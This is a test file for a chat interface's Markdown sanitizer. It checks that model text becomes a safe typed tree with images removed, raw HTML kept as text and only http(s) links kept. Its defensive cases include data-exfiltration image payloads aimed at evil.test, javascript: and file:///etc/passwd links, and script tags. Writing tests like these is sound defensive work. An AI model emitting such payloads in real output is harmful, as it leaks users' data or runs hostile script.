// Plan 08b step 4: the chat tab's sanitizer (T3). Model text becomes a typed tree; no node holds
// HTML, images never survive, links keep an href only for absolute http(s) URLs, and citations
// follow the daemon's grammar. Synthetic text only.

import { describe, expect, it } from "vitest";
import { type Block, type Inline, type Node, sanitize, targetScanReads } from "../src/ui/sanitize";

const A = "a".repeat(64);
const H = "0123456789abcdef".repeat(4);
const X = `x-${"b".repeat(64)}`;

const txt = (text: string): Inline => ({ t: "text", text });
const p = (...children: Inline[]): Block => ({ t: "p", children });

/** Every node of a tree, depth first. */
function walk(nodes: readonly Node[]): Node[] {
  const out: Node[] = [];
  for (const n of nodes) {
    out.push(n);
    if ("children" in n) {
      out.push(...walk(n.children));
    }
    if ("items" in n) {
      out.push(...walk(n.items));
    }
    if ("head" in n) {
      out.push(...walk(n.head), ...walk(n.rows.flat()));
    }
  }
  return out;
}

const KEYS: Record<string, string[]> = {
  p: ["children", "t"],
  h: ["children", "level", "t"],
  pre: ["t", "text"],
  table: ["align", "head", "rows", "t"],
  td: ["children", "t"],
  ul: ["items", "t"],
  ol: ["items", "t"],
  li: ["children", "t"],
  text: ["t", "text"],
  strong: ["children", "t"],
  em: ["children", "t"],
  code: ["t", "text"],
  br: ["t"],
  link: ["href", "label", "t"],
  cite: ["mid", "raw", "t"],
  removed: ["t"],
  image_removed: ["t"],
};

// Keys a node of that type may carry besides KEYS (P29: `ol.start`, only when not 1; a fence's
// language tag as `pre.lang`).
const OPTIONAL_KEYS: Record<string, string[]> = { ol: ["start"], pre: ["lang"] };

/** The tree uses only the documented node shapes, and every link is an absolute http(s) URL. */
function assertSafeTree(tree: readonly Block[]): void {
  for (const n of walk(tree)) {
    const keys = KEYS[n.t];
    expect(keys, `node type ${n.t}`).toBeDefined();
    const optional = OPTIONAL_KEYS[n.t] ?? [];
    expect(
      Object.keys(n)
        .filter((k) => !optional.includes(k))
        .sort(),
    ).toEqual(keys);
    if (n.t === "ol" && "start" in n) {
      expect(Number.isSafeInteger(n.start) && n.start !== 1 && (n.start ?? -1) >= 0).toBe(true);
    }
    if (n.t === "pre" && "lang" in n) {
      expect(n.lang).toMatch(/^[a-z0-9_+.#-]{1,20}$/);
    }
    if (n.t === "table") {
      for (const row of [n.head, ...n.rows]) expect(row).toHaveLength(n.align.length);
    }
    if (n.t === "link") {
      expect(URL.canParse(n.href)).toBe(true);
      expect(["http:", "https:"]).toContain(new URL(n.href).protocol);
    }
  }
}

const links = (tree: readonly Block[]): Node[] => walk(tree).filter((n) => n.t === "link");

describe("Markdown subset", () => {
  it("paragraphs, line breaks and blank lines", () => {
    expect(sanitize("one\ntwo\n\nthree\r\nfour")).toEqual([
      p(txt("one"), { t: "br" }, txt("two")),
      p(txt("three"), { t: "br" }, txt("four")),
    ]);
    expect(sanitize("")).toEqual([]);
    expect(sanitize("\n \n\t\n")).toEqual([]);
  });

  it("headings, levels above 3 shown as 3, closing hashes dropped", () => {
    expect(sanitize("# One\n## Two ##\n### Three\n###### Six\n#nospace")).toEqual([
      { t: "h", level: 1, children: [txt("One")] },
      { t: "h", level: 2, children: [txt("Two")] },
      { t: "h", level: 3, children: [txt("Three")] },
      { t: "h", level: 3, children: [txt("Six")] },
      p(txt("#nospace")),
    ]);
  });

  it("strong, em, code spans, escapes and intraword underscores", () => {
    expect(sanitize("**b** __b__ *e* _e_ `c` \\*x\\* snake_case_name")).toEqual([
      p(
        { t: "strong", children: [txt("b")] },
        txt(" "),
        { t: "strong", children: [txt("b")] },
        txt(" "),
        { t: "em", children: [txt("e")] },
        txt(" "),
        { t: "em", children: [txt("e")] },
        txt(" "),
        { t: "code", text: "c" },
        txt(" *x* snake_case_name"),
      ),
    ]);
  });

  it("nested emphasis, unmatched delimiters stay text", () => {
    expect(sanitize("***both*** *a **b** c* ** x* 2 * 3")).toEqual([
      p(
        { t: "strong", children: [{ t: "em", children: [txt("both")] }] },
        txt(" "),
        { t: "em", children: [txt("a "), { t: "strong", children: [txt("b")] }, txt(" c")] },
        txt(" ** x* 2 * 3"),
      ),
    ]);
  });

  it("code spans keep their content literally", () => {
    expect(sanitize("`` a ` b `` `**x** <b>` `unclosed")).toEqual([
      p(
        { t: "code", text: "a ` b" },
        txt(" "),
        { t: "code", text: "**x** <b>" },
        txt(" `unclosed"),
      ),
    ]);
  });

  it("lists: bullets, numbers, continuation lines, a kind change starts a new list", () => {
    expect(sanitize("- one\n  more\n* two\n1. three\n2) four\n\npara")).toEqual([
      {
        t: "ul",
        items: [
          { t: "li", children: [txt("one"), { t: "br" }, txt("more")] },
          { t: "li", children: [txt("two")] },
        ],
      },
      {
        t: "ol",
        items: [
          { t: "li", children: [txt("three")] },
          { t: "li", children: [txt("four")] },
        ],
      },
      p(txt("para")),
    ]);
  });

  it("ordered lists keep the model's numbers: blank lines between items, a start above 1", () => {
    const li = (...children: Inline[]) => ({ t: "li", children }) as const;
    expect(sanitize("1. a\n\n2. b")).toEqual([{ t: "ol", items: [li(txt("a")), li(txt("b"))] }]);
    expect(sanitize("3. third\n4. fourth")).toEqual([
      { t: "ol", start: 3, items: [li(txt("third")), li(txt("fourth"))] },
    ]);
    expect(sanitize("0) zero")).toEqual([{ t: "ol", start: 0, items: [li(txt("zero"))] }]);
    // The common loose-list shape: an indented paragraph after a blank line joins its item.
    expect(sanitize("1. **Foo**\n\n   detail\n\n\n2. **Bar**")).toEqual([
      {
        t: "ol",
        items: [
          li({ t: "strong", children: [txt("Foo")] }, { t: "br" }, { t: "br" }, txt("detail")),
          li({ t: "strong", children: [txt("Bar")] }),
        ],
      },
    ]);
    // A block between items splits the list; the second part keeps its number.
    expect(sanitize("2. x\n\n```\ncode\n```\n3. y")).toEqual([
      { t: "ol", start: 2, items: [li(txt("x"))] },
      { t: "pre", text: "code" },
      { t: "ol", start: 3, items: [li(txt("y"))] },
    ]);
  });

  it("a blank line closes a list unless an item of the same kind or an indented line follows", () => {
    const li = (...children: Inline[]) => ({ t: "li", children }) as const;
    expect(sanitize("- a\n\n- b\n\n1. c\n\npara\n\n  indented")).toEqual([
      { t: "ul", items: [li(txt("a")), li(txt("b"))] },
      { t: "ol", items: [li(txt("c"))] },
      p(txt("para")),
      p(txt("  indented")),
    ]);
    expect(sanitize("- a\n\n    # not a heading\n\n  # heading")).toEqual([
      { t: "ul", items: [li(txt("a"), { t: "br" }, { t: "br" }, txt("# not a heading"))] },
      { t: "h", level: 1, children: [txt("heading")] },
    ]);
    expect(sanitize("- a\n\n")).toEqual([{ t: "ul", items: [li(txt("a"))] }]);
  });

  it("a fence's info string is kept as the first line unless it is a language tag", () => {
    expect(sanitize("~~~ hidden words\nx\n~~~")).toEqual([{ t: "pre", text: "hidden words\nx" }]);
    expect(sanitize("```js ignore me\ncode\n```")).toEqual([
      { t: "pre", text: "js ignore me\ncode" },
    ]);
    expect(sanitize("```c++\na\n```\n```  objective-c  \nb\n```\n```\nc\n```")).toEqual([
      { t: "pre", text: "a", lang: "c++" },
      { t: "pre", text: "b", lang: "objective-c" },
      { t: "pre", text: "c" },
    ]);
  });

  it("fenced code blocks keep everything literal, an unclosed fence runs to the end", () => {
    expect(sanitize("before\n```ts\n<b>**x**</b>\n![i](https://evil.test/a)\n```\nafter")).toEqual([
      p(txt("before")),
      { t: "pre", text: "<b>**x**</b>\n![i](https://evil.test/a)", lang: "ts" },
      p(txt("after")),
    ]);
    expect(sanitize("~~~~\na\n~~~\nb")).toEqual([{ t: "pre", text: "a\n~~~\nb" }]);
  });

  it("an http(s) link is kept, inert data only: href and label", () => {
    expect(
      sanitize('[the site](https://example.test/a?b=1 "title") [x](<http://e.test/a b>)'),
    ).toEqual([
      p({ t: "link", href: "https://example.test/a?b=1", label: "the site" }, txt(" "), {
        t: "link",
        href: "http://e.test/a%20b",
        label: "x",
      }),
    ]);
    expect(sanitize("[](https://e.test/)")).toEqual([
      p({ t: "link", href: "https://e.test/", label: "https://e.test/" }),
    ]);
  });
});

describe("exfiltration payloads: no fetchable URL, no live link", () => {
  const cases: [string, string, Block[]][] = [
    ["markdown image", "![](https://evil.test/?q=SECRET)", [p({ t: "image_removed" })]],
    ["data: image", "![x](data:image/png;base64,iVBORw0KGgoSECRET=)", [p({ t: "image_removed" })]],
    [
      "image with a title and an angle-bracket target",
      '![x](<https://evil.test/SECRET> "t") ![y](https://evil.test/(SECRET))',
      [p({ t: "image_removed" }, txt(" "), { t: "image_removed" })],
    ],
    ["raw <img>", "<img src=https://evil.test/a>", [p(txt("<img src=https://evil.test/a>"))]],
    ["raw <a>", '<a href="https://evil.test">x</a>', [p(txt('<a href="https://evil.test">x</a>'))]],
    ["javascript: link", "[click](javascript:alert(1))", [p(txt("click"))]],
    [
      "javascript: in other spellings",
      "[a](JAVASCRIPT:alert(1)) [b](<javascript:alert(1)>) [c]( javascript:alert(1) ) [d](&#106;avascript:alert(1))",
      [p(txt("a b c d"))],
    ],
    [
      "other schemes and relative targets",
      "[a](data:text/html,x) [b](file:///etc/passwd) [c](//evil.test/x) [d](/x) [e](vbscript:x)",
      [p(txt("a b c d e"))],
    ],
    [
      "removed marker with a target",
      "[citation removed](https://evil.test)",
      [p({ t: "removed" }, txt("(https://evil.test)"))],
    ],
    [
      "reference-style link",
      "[x][1]\n\n[1]: https://evil.test",
      [p(txt("[x][1]")), p(txt("[1]: https://evil.test"))],
    ],
    ["autolink", "<https://evil.test>", [p(txt("<https://evil.test>"))]],
    ["bare URL", "see https://evil.test/x now", [p(txt("see https://evil.test/x now"))]],
    [
      "nested emphasis around an image",
      "**_![a](https://evil.test/SECRET.png)_** *![b](https://evil.test/SECRET)*",
      [
        p({ t: "strong", children: [{ t: "em", children: [{ t: "image_removed" }] }] }, txt(" "), {
          t: "em",
          children: [{ t: "image_removed" }],
        }),
      ],
    ],
    [
      "image inside a link label",
      "[![a](https://evil.test/SECRET.png)](https://evil.test)",
      [p(txt("["), { t: "image_removed" }, txt("](https://evil.test)"))],
    ],
    [
      "image in a list item and a heading",
      "- ![a](https://evil.test/SECRET)\n# ![b](https://evil.test/SECRET)",
      [
        { t: "ul", items: [{ t: "li", children: [{ t: "image_removed" }] }] },
        { t: "h", level: 1, children: [{ t: "image_removed" }] },
      ],
    ],
  ];

  it.each(cases)("%s", (_name, input, expected) => {
    const tree = sanitize(input);
    expect(tree).toEqual(expected);
    expect(links(tree)).toEqual([]);
    expect(JSON.stringify(tree)).not.toContain("SECRET");
    assertSafeTree(tree);
  });

  it("an unterminated image is text, never an image", () => {
    const tree = sanitize("![a](https://evil.test/x");
    expect(tree).toEqual([p(txt("![a](https://evil.test/x"))]);
  });
});

describe("citations in the tree", () => {
  it("a citation becomes a cite node with its raw text, in any bracket form", () => {
    expect(sanitize(`See [${A}] and 【 mid: ${X} 】.`)).toEqual([
      p(
        txt("See "),
        { t: "cite", mid: A, raw: `[${A}]` },
        txt(" and "),
        { t: "cite", mid: X, raw: `【 mid: ${X} 】` },
        txt("."),
      ),
    ]);
  });

  it("a citation spanning lines is one cite (the daemon's grammar runs over the whole text)", () => {
    expect(sanitize(`x [\nmid:\n${A}\n] y`)).toEqual([
      p(txt("x "), { t: "cite", mid: A, raw: `[\nmid:\n${A}\n]` }, txt(" y")),
    ]);
  });

  it("text outside the grammar is not a cite", () => {
    const tree = sanitize(`[${A.toUpperCase()}] [${A}】 [${" ".repeat(9)}${A}] ${A}`);
    expect(walk(tree).filter((n) => n.t === "cite")).toEqual([]);
  });

  it("a citation followed by a link target stays a cite, the target text", () => {
    expect(sanitize(`[${A}](https://evil.test)`)).toEqual([
      p({ t: "cite", mid: A, raw: `[${A}]` }, txt("(https://evil.test)")),
    ]);
  });

  it("inside code it is raw text; inside emphasis, lists and headings it is a cite", () => {
    expect(sanitize(`\`[${A}]\`\n\`\`\`\n[${H}]\n\`\`\``)).toEqual([
      p({ t: "code", text: `[${A}]` }),
      { t: "pre", text: `[${H}]` },
    ]);
    const cite = { t: "cite", mid: A, raw: `[${A}]` } as const;
    expect(sanitize(`**[${A}]**\n\n- [${A}]\n# [${A}]`)).toEqual([
      p({ t: "strong", children: [cite] }),
      { t: "ul", items: [{ t: "li", children: [cite] }] },
      { t: "h", level: 1, children: [cite] },
    ]);
  });

  it("a cite in a link label stays its raw text inside the label", () => {
    expect(sanitize(`[see [${A}]](https://e.test/)`)).toEqual([
      p({ t: "link", href: "https://e.test/", label: `see [${A}]` }),
    ]);
  });

  it("the removed marker is its own node; a marker-like text is not", () => {
    expect(sanitize("a [citation removed] b [citation  removed]")).toEqual([
      p(txt("a "), { t: "removed" }, txt(" b [citation  removed]")),
    ]);
  });

  it("the placeholder characters in model text cannot forge a cite", () => {
    const forged = "\ue0000\ue001";
    expect(sanitize(`${forged} [${A}]`)).toEqual([
      p(txt("\ufffd0\ufffd "), { t: "cite", mid: A, raw: `[${A}]` }),
    ]);
    expect(sanitize(forged)).toEqual([p(txt("\ufffd0\ufffd"))]);
  });
});

describe("random input", () => {
  // A seeded generator over Markdown-ish fragments: the tree is always well formed and safe.
  const FRAGMENTS = [
    "*",
    "**",
    "_",
    "`",
    "```",
    "~~~",
    "[",
    "]",
    "(",
    ")",
    "!",
    "<",
    ">",
    "\\",
    "\n",
    "\n\n",
    "- ",
    "1. ",
    "# ",
    " ",
    "word",
    "https://evil.test/",
    "javascript:",
    "data:",
    "<img src=x>",
    "[citation removed]",
    `[${A}]`,
    `【${X}】`,
    "mid:",
    '"',
    "\ue000",
    "\ue001",
  ];

  it("never throws, uses only documented nodes, links are http(s) only", () => {
    let seed = 0x5eed;
    const next = (): number => {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      return seed;
    };
    for (let n = 0; n < 2000; n += 1) {
      let s = "";
      const len = next() % 40;
      for (let k = 0; k < len; k += 1) {
        s += FRAGMENTS[next() % FRAGMENTS.length];
      }
      const tree = sanitize(s);
      assertSafeTree(tree);
      for (const node of walk(tree)) {
        if (node.t === "text") {
          expect(node.text).not.toMatch(/[\ue000\ue001]/);
        }
      }
    }
  });

  it("unclosed link targets stay linear (P31)", () => {
    // Before the bound, `[a](x` x 8000 took seconds (each `[` rescanned to the end of the text).
    // Work is counted, not timed (no wall-clock budget in the fast check): doubling the text
    // doubles the characters the target scans read; unbounded scans would quadruple them.
    const reads = (unit: string, n: number): number => {
      const tree = sanitize(unit.repeat(n));
      expect(links(tree), unit).toEqual([]);
      assertSafeTree(tree);
      return targetScanReads();
    };
    for (const unit of ["[a](x", "[a](<x", '[a](x "t', "[a](x (t", "[a](x(y)"]) {
      const half = reads(unit, 4000);
      const full = reads(unit, 8000);
      expect(half, unit).toBeGreaterThan(0);
      expect(full / half, unit).toBeLessThan(2.2);
      // Each `[` starts at most one target scan of at most 2048 characters (MAX_TARGET).
      expect(full, unit).toBeLessThanOrEqual(8000 * 2048);
    }
  });

  it("a link target over the length bound, or nesting parentheses too deep, is text", () => {
    const long = `https://e.test/${"a".repeat(2100)}`;
    expect(links(sanitize(`[x](${long})`))).toEqual([]);
    expect(sanitize(`[x](${long})`)).toEqual([p(txt(`[x](${long})`))]);
    const ok = `https://e.test/${"a".repeat(1900)}`;
    expect(links(sanitize(`[x](${ok})`))).toEqual([{ t: "link", href: ok, label: "x" }]);
    const deep = `https://e.test/${"(".repeat(33)}${")".repeat(33)}`;
    expect(links(sanitize(`[x](${deep})`))).toEqual([]);
    const nested = `https://e.test/${"(".repeat(32)}${")".repeat(32)}`;
    expect(links(sanitize(`[x](${nested})`)).length).toBe(1);
  });

  it("a long run of unmatched delimiters finishes", () => {
    const s = "*a _b `c [d ![e (".repeat(4000);
    const tree = sanitize(s);
    expect(tree.length).toBe(1);
    assertSafeTree(tree);
  });

  it("table-shaped input never throws and keeps every row as wide as its header", () => {
    const PARTS = ["|", "| ", " |", "---", ":--", "--:", ":-:", "\\|", "a", "`x|y`", "\n", "\n\n"];
    let seed = 0x7ab1e;
    const next = (): number => {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      return seed;
    };
    for (let n = 0; n < 2000; n += 1) {
      let s = "";
      for (let k = next() % 40; k > 0; k -= 1) s += PARTS[next() % PARTS.length];
      assertSafeTree(sanitize(s));
    }
  });
});

describe("tables", () => {
  const td = (...children: Inline[]) => ({ t: "td", children }) as const;

  it("a header row, a delimiter row and body rows make a table with alignments", () => {
    expect(
      sanitize("| Name | Count | Note |\n|:--|--:|:-:|\n| a | **2** | x |\n| b | 3 |"),
    ).toEqual([
      {
        t: "table",
        align: ["left", "right", "center"],
        head: [td(txt("Name")), td(txt("Count")), td(txt("Note"))],
        rows: [
          [td(txt("a")), td({ t: "strong", children: [txt("2")] }), td(txt("x"))],
          // A missing cell is empty.
          [td(txt("b")), td(txt("3")), td()],
        ],
      },
    ]);
  });

  it("outer pipes are optional, extra cells are dropped, an escaped pipe is text", () => {
    expect(sanitize("a | b\n--- | ---\n1 \\| 2 | 3 | 4")).toEqual([
      {
        t: "table",
        align: [null, null],
        head: [td(txt("a")), td(txt("b"))],
        rows: [[td(txt("1 | 2")), td(txt("3"))]],
      },
    ]);
  });

  it("a table may follow a paragraph line; a blank line or a line without a pipe ends it", () => {
    expect(sanitize("Here:\n| a |\n| - |\n| 1 |\nafter\n\n| b |\n|---|\n\nnext")).toEqual([
      p(txt("Here:")),
      { t: "table", align: [null], head: [td(txt("a"))], rows: [[td(txt("1"))]] },
      p(txt("after")),
      { t: "table", align: [null], head: [td(txt("b"))], rows: [] },
      p(txt("next")),
    ]);
  });

  it("not a table: no delimiter row, a delimiter of another width, too many columns", () => {
    expect(sanitize("| a | b |\n| c | d |")).toEqual([
      p(txt("| a | b |"), { t: "br" }, txt("| c | d |")),
    ]);
    expect(sanitize("| a | b |\n|---|")).toEqual([p(txt("| a | b |"), { t: "br" }, txt("|---|"))]);
    const wide = `${"|x".repeat(65)}|\n${"|-".repeat(65)}|`;
    expect(sanitize(wide).map((b) => b.t)).toEqual(["p"]);
    const ok = `${"|x".repeat(64)}|\n${"|-".repeat(64)}|`;
    expect(sanitize(ok).map((b) => b.t)).toEqual(["table"]);
  });

  it("cells go through the same inline rules: images removed, links http(s) only, cites kept", () => {
    const tree = sanitize(
      `| x | y |\n|---|---|\n| ![i](https://evil.test/p.png) | [go](javascript:alert(1)) |\n` +
        `| [ok](https://example.test/) | [${A}] |`,
    );
    assertSafeTree(tree);
    const nodes = walk(tree);
    expect(nodes.filter((n) => n.t === "image_removed")).toHaveLength(1);
    expect(links(tree)).toEqual([{ t: "link", href: "https://example.test/", label: "ok" }]);
    expect(nodes.filter((n) => n.t === "cite")).toEqual([{ t: "cite", mid: A, raw: `[${A}]` }]);
    expect(JSON.stringify(tree)).not.toContain("evil.test");
    expect(JSON.stringify(tree)).not.toContain("javascript");
  });

  it("raw HTML in a cell stays text", () => {
    const tree = sanitize("| h |\n|---|\n| <script>alert(1)</script> |");
    expect(tree).toEqual([
      {
        t: "table",
        align: [null],
        head: [td(txt("h"))],
        rows: [[td(txt("<script>alert(1)</script>"))]],
      },
    ]);
  });
});
